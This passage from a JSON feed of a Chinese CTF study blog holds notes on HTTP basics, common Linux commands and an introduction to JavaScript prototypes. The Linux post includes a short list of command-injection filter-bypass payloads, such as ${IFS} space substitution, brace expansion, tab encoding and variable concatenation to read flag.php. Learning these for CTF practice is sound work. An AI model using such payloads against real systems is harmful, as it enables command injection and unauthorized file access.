连接，这意味着每次请求都会造成无谓的 TCP 连接建立和断开而增加通信量开销。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006152833999.png\" alt=\"image-20241006152833999\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006152910271.png\" alt=\"image-20241006152910271\" /></p>\n<p>因此出现了持久连接 (HTTP Persistent Connections，也称为 HTTP keep-alive 或<br />\n HTTP connection reuse) 的方法。其特点为只要任意一段没有明确提出断开连接，则保持 TCP 连接状态，减轻了服务器的负载，提高 Web 页面的显示效率。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153130650.png\" alt=\"image-20241006153130650\" /></p>\n<p>持久连接使得多数请求以管线化方式发送成为可能。<strong>管线化技术</strong>出现后，不用等待响应亦可直接发送下一个请求。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153247884.png\" alt=\"image-20241006153247884\" /></p>\n<h3 id=\"28使用cookie的状态管理\"><a class=\"anchor\" href=\"#28使用cookie的状态管理\">#</a> 2.8 使用 Cookie 的状态管理</h3>\n<p>由于 HTTP 是无状态协议，它不会对之前发生过的请求和相应的状态进行管理。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153353937.png\" alt=\"image-20241006153353937\" /></p>\n<p>因此引入了<strong> Cookie 技术</strong>。通过在请求和响应报文中写入 Cookie 信息来控制客户端状态。</p>\n<p>客户端保存由服务器端发送的响应报文中叫做 Set-Cookie 的首部字段信息，下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值发出。服务器通过客户端发送的 Cookie 得到之前的状态信息。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153715476.png\" alt=\"image-20241006153715476\" /></p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153722313.png\" alt=\"image-20241006153722313\" /></p>\n<p>1. 请求报文 (无 Cookie 时状态)</p>\n<pre><code class=\"language-Http\">GET /reader/ HTTP/1.1\nHost: hackr.jp\n*首部字段内没有Cookie的相关信息\n</code></pre>\n<p>2. 响应报文 (服务端生成 Cookie 信息)</p>\n<pre><code class=\"language-HTTP\">HTTP/1.1 200 OK\nDate: Thu, 12 Jul 2012 07:12:20 GMT\nServer: Apache\n＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,\n10-Oct-12 07:12:20 GMT＞\nContent-Type: text/plain; charset=UTF-8\n</code></pre>\n<p>3. 请求报文 (自动发送保存着的 Cookie 信息)</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/image/</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">hackr.jp</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">sid=1342077140226724</span></span></pre></td></tr></table></figure><h2 id=\"第三章\"><a class=\"anchor\" href=\"#第三章\">#</a> 第三章</h2>\n<h3 id=\"31-32-http报文\"><a class=\"anchor\" href=\"#31-32-http报文\">#</a> 3.1-3.2 HTTP 报文</h3>\n<p>用于 HTTP 协议交互的信息被称为 HTTP 报文。求端（客户端）的 HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP 报文本身是由多行（用 CR+LF 作换行符）数据构成的字符串文本。</p>\n<p>HTTP 报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。通常，并不一定要有报文主体。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006165128464.png\" alt=\"image-20241006165128464\" /></p>\n<p>报文和响应报文的结构</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006165151102.png\" alt=\"image-20241006165151102\" /></p>\n<p>请求报文（上）和响应报文（下）的实例</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006165307378.png\" alt=\"image-20241006165307378\" /></p>\n<p>请求报文和响应报文的首部内容由以下数据组成:</p>\n<p><strong>请求行</strong>：包含用于请求的方法，请求 URI 和 HTTP 版本。<br />\n<strong>状态行</strong>：包含表明响应结果的状态码，原因短语和 HTTP 版本。<br />\n<strong>首部字段</strong>：包含表示请求和响应的各种条件和属性的各类首部。一般有 4 种首部，分别是：通用首部、请求首部、响应首部和实体首部。(根据名称基本能够得出首部出现在对应的报文类型，通用首部请求和响应报文共有，实体首部约束实体相关的属性)</p>\n<p>** 其他:** 可能包含 HTTP 的 RFC 里未定义的首部（Cookie 等）</p>\n<h3 id=\"33编码提升传输速率\"><a class=\"anchor\" href=\"#33编码提升传输速率\">#</a> 3.3 编码提升传输速率</h3>\n<p>HTTP 在传输数据时可以可以在传输过程中通过编码提升传输速率。</p>\n<p><strong>报文主体和实体主体的差异</strong>：报文是 HTTP 通信中的基本单位，由 8 位组字节流（字节流是指由 8 位字节组成的连续数据流）组成，通过 HTTP 通信传输。实体作为请求或响应的有效载荷数据 (补充项) 被传输，其内容由实体首部和实体主体组成。</p>\n<p>HTTP 报文的主体用于传输请求或响应的实体主体。通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体<br />\n主体的内容发生变化，才导致它和报文主体产生差异。</p>\n<p><strong>压缩传输的内容编码</strong>：HTTP 协议常用的内容编码有以下几种：gzip（GNU zip）、compress（UNIX 系统的标准压缩）、deflate（zlib）、identity（不进行编码）</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006170218993.png\" alt=\"image-20241006170218993\" /></p>\n<p><strong>分割发送的分块传输编码</strong>：HTTP 请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面。在传输大容量数据时，<strong>通过把数据分割成多块，能够让浏览器逐步显示页面。<strong>这种把实体主体分块的功能称为</strong>分块传输编码</strong>（Chunked Transfer Coding）。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006170644942.png\" alt=\"image-20241006170644942\" /></p>\n<h3 id=\"34-发送多种数据的多部分对象集合\"><a class=\"anchor\" href=\"#34-发送多种数据的多部分对象集合\">#</a> 3.4 发送多种数据的多部分对象集合</h3>\n<p>HTTP 协议中采纳了多部分对象集合，发送的一份报文主体内可含有多类型实体。通常是在图片或文本文件等上传时使用。<br />\n多部分对象集合包含的对象如下。<br />\n<strong>multipart/form-data</strong><br />\n 在 Web 表单文件上传时使用。<br />\n<strong>multipart/byteranges</strong><br />\n 状态码 206（Partial Content，部分内容）响应报文包含了多个范围的内容时使用。<br />\n<strong>multipart/form-data</strong></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=AaB03x</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>--AaB03x</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"field1\"</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Joe Blow</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>--AaB03x</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"pics\"; filename=\"file1.txt\"</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/plain</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token text-plain\">...（file1.txt的数据）...</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>--AaB03x--</span></pre></td></tr></table></figure><p><strong>multipart/byteranges</strong></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">206</span> <span class=\"token reason-phrase string\">Partial Content</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Date</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Fri, 13 Jul 2012 02:45:26 GMT</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Last-Modified</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Fri, 31 Aug 2007 02:02:20 GMT</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/byteranges; boundary=THIS_STRING_SEPARATES</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>--THIS_STRING_SEPARATES</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/pdf</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes 500-999/8000</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>54</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>...（范围指定的数据）...</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>--THIS_STRING_SEPARATES</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/pdf</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes 7000-7999/8000</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>...（范围指定的数据）...</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>--THIS_STRING_SEPARATES--</pre></td></tr></table></figure><p>在 HTTP 报文中使用多部分对象集合时，需要在首部字段里加上 Content-type。<strong>使用 boundary 字符串</strong>来划分多部分对象集合指明的各类实体。在<strong> boundary</strong> 字符串指定的各个实体的起始行之前插入 “<strong>--</strong>” 标记（例如：--AaB03x、--THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入 “<strong>--</strong>” 标记（例如：-AaB03x--、--THIS_STRING_SEPARATES--）作为结束。</p>\n<p>多部分对象集合的每个部分类型中，都可以含有首部字段。另外，可<br />\n以在某个部分中嵌套使用多部分对象集合。有关多部分对象集合更详<br />\n细的解释，请参考 RFC2046。</p>\n<h3 id=\"35-获取部分内容的范围请求\"><a class=\"anchor\" href=\"#35-获取部分内容的范围请求\">#</a> 3.5 获取部分内容的范围请求</h3>\n<p>为了解决传输过程中网络中断的情况，实现类似于断点续传的功能，使用 “范围请求 &quot; 机制来实现。</p>\n<p>执行范围请求时，使用首部字段 Range。响应会返回状态码为 206Partial Content 的响应报文，另外对于多重范围请求的，响应会在首部字段 Content-Type  标明 multipart/byteranges。如果服务器无法响应范围请求则返回 200 OK 和完整的实体内容。</p>\n<p><img loading=\"lazy\" data-src=\"C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006171019556.png\" alt=\"image-20241006171019556\" /></p>\n<p><strong>byte 范围的指定形式:</strong></p>\n<p><strong>5001~10 000 字节</strong></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes=5001-10000</span></span></pre></td></tr></table></figure><p><strong>从 5001 字节之后全部的</strong></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes=5001-</span></span></pre></td></tr></table></figure><p>从一开始到 3000 字节和 5000~7000 字节的多重范围</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes=-3000, 5000-7000</span></span></pre></td></tr></table></figure><h3 id=\"36-内容协商返回最合适的内容\"><a class=\"anchor\" href=\"#36-内容协商返回最合适的内容\">#</a> 3.6 内容协商返回最合适的内容</h3>\n<p>内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。</p>\n<p>相关字段主要有：</p>\n<ul>\n<li>Accept</li>\n<li>Accept-Charset</li>\n<li>Accept-Encoding</li>\n<li>Accept-Language</li>\n<li>Content-Language</li>\n</ul>\n<p>内容协商有 3 种类型：</p>\n<ul>\n<li><strong>服务器驱动协商</strong> (Server-driven Negotiation) 由服务器端进行内容协商。以请求的首部字段为参考，在服务器端自动处理。但对用户来说，以浏览器发送的信息作为判定的依据并不一定能筛选出最优内容。</li>\n<li><strong>客户端驱动协商</strong> (Agent-driven Negotiation) 由客户端进行内容协商的方式。用户从浏览器显示的可选项列表中手动选择。还可以利用 JavaScript 脚本在 web 页面上自动进行上述选择。比如按 OS 的类型或浏览器类型，自行切换成 PC 版页面或手机版页面。</li>\n<li><strong>透明协商</strong> (Transparent Negotiation) 是服务器驱动和客户端驱动的结合体，是由服务器端和客户端各自进行内容协商的一种方法</li>\n</ul>\n",
            "tags": [
                "CTF",
                "Web"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2024/09/20/Linux/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/",
            "url": "https://ly1tnt.github.io/2024/09/20/Linux/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/",
            "title": "Linux基本命令",
            "date_published": "2024-09-20T10:47:30.000Z",
            "content_html": "<h1 id=\"linux基本命令\"><a class=\"anchor\" href=\"#linux基本命令\">#</a> Linux 基本命令</h1>\n<h3 id=\"1查看文件\"><a class=\"anchor\" href=\"#1查看文件\">#</a> 1. 查看文件</h3>\n<p>1.cat</p>\n<p>2.od  Linux 系统中一个十六进制查看命令 可以查看文件文件或数据的内容</p>\n<p>3.more 类似 cat, 不过会以一页一页的形式显示。最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示</p>\n<p>4.xxd 将文件或数据转换为十六进制格式显示，类似于十六进制查看器。</p>\n<p>5.rev 反转并显示 它可以将指定文件或标准输入的每一行文本的字符顺序反转，然后输出到标准输出。</p>\n<h3 id=\"2创建链接\"><a class=\"anchor\" href=\"#2创建链接\">#</a> 2. 创建链接</h3>\n<p><strong>sudo ln -s</strong></p>\n<p>ex:</p>\n<p><code>ln</code> ：创建链接的命令。</p>\n<p><code>-s</code> ：表示创建的是<strong>符号链接</strong>（软链接），而不是硬链接。符号链接类似于 Windows 的快捷方式，它指向目标文件，而不是复制该文件。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">ln</span> <span class=\"token parameter variable\">-s</span> checksec /usr/local/bin/checksec</pre></td></tr></table></figure><p>/usr/local/bin/checksec：这是符号链接的目标路径。符号链接将被创建在 /usr/local/bin 目录下，并命名为 checksec,/usr/local/bin 是系统默认的全局可执行文件路径之一，创建符号连接后可以直接通过命令行输入 <code> chechsec</code>  执行</p>\n<h3 id=\"3管道符命令\"><a class=\"anchor\" href=\"#3管道符命令\">#</a> 3. 管道符 | 命令</h3>\n<p>“|” 是 Linux 管道命令操作符，简称管道符。使用此管道符 “|” 可以将两个命令分隔开，“|” 左边命令的输出就会作为 “|” 右边命令的输入，此命令可连续使用，第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> hello.sh <span class=\"token operator\">|</span> <span class=\"token function\">sort</span> <span class=\"token operator\">|</span> <span class=\"token function\">uniq</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> 'better’</pre></td></tr></table></figure><h4 id=\"4多命令顺序执行\"><a class=\"anchor\" href=\"#4多命令顺序执行\">#</a> 4. 多命令顺序执行</h4>\n<p><strong>;</strong> 分割每一个命令</p>\n<p>** 格式:** 命令；命令 2</p>\n<p>作用：多命令依次执行，命令之间没有逻辑关系。</p>\n<p><strong>&amp;&amp;</strong>  逻辑与</p>\n<p>** 格式:** 命令 &amp;&amp; 命令 2</p>\n<p>作用：当命令 1 正确执行，则命令 2 才会执行。当命令 1 执行不正确，命令 2 不会执行。</p>\n<p><strong>||</strong>  逻辑或</p>\n<p><strong>格式</strong>：格式：命令 1 || 命令 2</p>\n<p>作用：当命令 1 执行不正确，这命令 2 执行。</p>\n<p><strong>&amp;</strong> 将任务置于后台执行 (前面和后面命令都要执行，无论前面真假？搜索到的结果不一样)</p>\n<h3 id=\"4命令绕过空格\"><a class=\"anchor\" href=\"#4命令绕过空格\">#</a> 4. 命令绕过空格</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$&#123;<span class=\"token environment constant\">IFS</span>&#125;</span><span class=\"token variable\">$9</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token environment constant\">IFS</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token environment constant\">$IFS</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$&#123;<span class=\"token environment constant\">IFS</span>&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token environment constant\">$IFS</span><span class=\"token variable\">$1</span> //<span class=\"token variable\">$1</span>改成$加其他数字貌似都行</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token environment constant\">IFS</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">&lt;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">&lt;></span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span>cat,flag.php<span class=\"token punctuation\">&#125;</span>  //用逗号实现了空格功能，需要用<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>括起来</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>%20   <span class=\"token punctuation\">(</span>space<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>%09   <span class=\"token punctuation\">(</span>tab<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token assign-left variable\">X</span><span class=\"token operator\">=</span><span class=\"token string\">$'cat<span class=\"token entity\" title=\"\\x09\">\\x09</span>./flag.php'</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$X</span>       （<span class=\"token punctuation\">\\</span>x09表示tab，也可以用<span class=\"token punctuation\">\\</span>x20）</pre></td></tr></table></figure><h3 id=\"5grep命令\"><a class=\"anchor\" href=\"#5grep命令\">#</a> 5.grep 命令</h3>\n<pre><code class=\"language-linux\">grep [options] pattern [files]\n</code></pre>\n<p>在文件 file.txt 中查找字符串 &quot;hello&quot;，并打印匹配的行：</p>\n<p><code>grep hello file.txt</code></p>\n<h3 id=\"6内联使用\"><a class=\"anchor\" href=\"#6内联使用\">#</a> 6. 内联使用</h3>\n<h4 id=\"绕过\"><a class=\"anchor\" href=\"#绕过\">#</a> `` 绕过</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> <span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ls</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> fla<span class=\"token variable\">`</span></span></pre></td></tr></table></figure><h3 id=\"7内联执行绕过\"><a class=\"anchor\" href=\"#7内联执行绕过\">#</a> 7. 内联执行绕过</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">a</span><span class=\"token operator\">=</span>c<span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">b</span><span class=\"token operator\">=</span>a<span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">c</span><span class=\"token operator\">=</span>t<span class=\"token punctuation\">;</span><span class=\"token variable\">$a</span><span class=\"token variable\">$b</span><span class=\"token variable\">$c</span> /1.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token assign-left variable\">a</span><span class=\"token operator\">=</span>f<span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">c</span><span class=\"token operator\">=</span>a<span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">d</span><span class=\"token operator\">=</span>g<span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">b</span><span class=\"token operator\">=</span>l<span class=\"token punctuation\">;</span><span class=\"token function\">cat</span> <span class=\"token variable\">$a</span><span class=\"token variable\">$b</span><span class=\"token variable\">$c</span><span class=\"token variable\">$d</span>.php（abcd拼接出来flag）</pre></td></tr></table></figure>",
            "tags": [
                "Linux"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2024/09/20/CTF/Web/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "url": "https://ly1tnt.github.io/2024/09/20/CTF/Web/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "title": "JS原型链污染",
            "date_published": "2024-09-20T10:47:30.000Z",
            "content_html": "<h1 id=\"原型链污染\"><a class=\"anchor\" href=\"#原型链污染\">#</a> 原型链污染</h1>\n<p>原型链污染（Prototype Pollution）是一种 web 应用程序中常见的安全漏洞，主要影响使用 JavaScript 的应用程序。它是一种攻击技术，通过修改 JavaScript 对象的原型链，来实现对应用程序的非法操作和控制。</p>\n<p>JavaScript 中的对象是通过<strong>原型链进行继承的</strong>。</p>\n<p>每个对象都有一个指向其原型的链接，它允许对象从其原型中继承属性和方法。当 JavaScript 代码在处理输入时，如果不适当地允许用户控制原型链上的属性，攻击者就可以操纵原型链，并在目标对象上添加、修改或删除属性。</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 创建一个构造函数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 给构造函数的 prototype 添加一个方法</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">sayHello</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Hello, I am '</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 创建一个实例</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">const</span> john <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token string\">'John'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 使用 __proto__ 访问原型对象</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>john<span class=\"token punctuation\">.</span>__proto__ <span class=\"token operator\">===</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 使用 constructor 访问构造函数</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>john<span class=\"token punctuation\">.</span>constructor <span class=\"token operator\">===</span> Person<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 使用 Object.getPrototypeOf () 访问原型对象</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Object<span class=\"token punctuation\">.</span><span class=\"token function\">getPrototypeOf</span><span class=\"token punctuation\">(</span>john<span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// 使用原型链调用方法</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>john<span class=\"token punctuation\">.</span><span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出: \"Hello, I am John\"</span></pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "Web"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2024/04/15/CTF/Web/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/",
            "url": "https://ly1tnt.github.io/2024/04/15/CTF/Web/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/",
            "title": "PHP伪协议",
            "date_published": "2024-04-15T13:55:50.000Z",
